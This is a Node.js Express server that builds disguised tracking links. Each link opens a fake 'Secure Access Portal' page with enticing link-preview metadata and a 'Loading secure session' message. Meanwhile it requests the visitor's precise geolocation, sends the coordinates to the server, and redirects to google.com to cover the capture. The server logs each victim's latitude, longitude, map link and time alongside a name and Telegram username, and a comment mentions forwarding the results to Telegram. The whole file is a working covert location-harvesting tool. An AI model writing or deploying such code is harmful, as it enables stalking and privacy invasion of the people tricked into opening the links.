const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve uploaded images
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

// Serve public assets (optional)
app.use(express.static('public'));

const BASE_URL = process.env.BASE_URL || 'http://localhost:3000';


// ======================
// LOAD LINKS FROM FILE
// ======================
function getLinks() {
    if (!fs.existsSync('links.json')) return [];
    return JSON.parse(fs.readFileSync('links.json'));
}

function saveLinks(data) {
    fs.writeFileSync('links.json', JSON.stringify(data, null, 2));
}


// ======================
// TRACKING PAGE ROUTE
// ======================
app.get('/t/:id', (req, res) => {
    const linkId = req.params.id;

    const links = getLinks();
    const linkData = links.find(l => l.linkId === linkId);

    if (!linkData) {
        return res.status(404).send('Invalid or expired link');
    }

    const imageUrl = `${BASE_URL}${linkData.thumbnail}`;

    res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>Secure Access</title>

    <!-- Open Graph Preview -->
    <meta property="og:title" content="Secure Access Portal">
    <meta property="og:description" content="Click to view secure content">
    <meta property="og:image" content="${imageUrl}">
    <meta property="og:url" content="${BASE_URL}/t/${linkId}">
    <meta property="og:type" content="website">

    <meta name="viewport" content="width=device-width, initial-scale=1">

    <style>
        body {
            font-family: Arial;
            text-align: center;
            padding: 50px;
        }
    </style>
</head>

<body>
    <h2>Loading secure session...</h2>
    <p>Please wait</p>

<script>
navigator.geolocation.getCurrentPosition(
    function(position) {

        fetch('/save-location', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                linkId: "${linkId}",
                latitude: position.coords.latitude,
                longitude: position.coords.longitude
            })
        }).then(() => {
            window.location.href = "https://google.com";
        });

    },
    function(error) {
        document.body.innerHTML =
        "<h3>Connection timeout or permission denied</h3>";
    },
    {
        enableHighAccuracy: true
    }
);
</script>

</body>
</html>
    `);
});


// ======================
// RECEIVE LOCATION
// ======================
app.post('/save-location', (req, res) => {
    const { linkId, latitude, longitude } = req.body;

    const links = getLinks();
    const linkData = links.find(l => l.linkId === linkId);

    console.log('========================');
    console.log('📍 LOCATION CAPTURED');
    console.log('Name:', linkData?.ownerName);
    console.log('Telegram:', linkData?.telegramUsername);
    console.log('Latitude:', latitude);
    console.log('Longitude:', longitude);
    console.log('Map:', `https://maps.google.com/?q=${latitude},${longitude}`);
    console.log('Time:', new Date().toISOString());
    console.log('========================');

    // OPTIONAL: You can later connect Telegram bot here

    res.json({ status: 'ok' });
});


// ======================
// START SERVER
// ======================
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});